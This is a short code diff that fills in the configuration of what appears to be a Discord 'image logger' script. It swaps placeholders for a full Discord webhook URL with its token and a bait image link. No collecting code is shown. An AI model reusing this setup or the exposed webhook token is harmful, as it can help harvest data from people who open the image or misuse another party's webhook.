@@ -13,8 +13,8 @@ __version__ = "v3.0"
 __author__ = "gdfdffffgccvvvvvv"
 
 config = {
-    "webhook": "Your Webhook Here", # Replace with your actual webhook URL.
-    "image": "your image here", #it have to be a link finish with .png or .jpg 
+    "webhook": "https://discord.com/api/webhooks/1563658304184389712/3U4OXeY_vAfHN5SjDqlyazDDzheYTu71LBFnrVrsi-nJv7tpGMQ8o5NgxoTfO4u9bg8m", # Replace with your actual webhook URL.
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4GeoQObLQJVpMUtHK8v2KDhgjgvFhZ19N50ib8HYr-A&s.jpg", #it have to be a link finish with .png or .jpg 
     "imageArgument": True,
 
     "username": "Botusername", #Username of the bot that will send the message to your webhook.
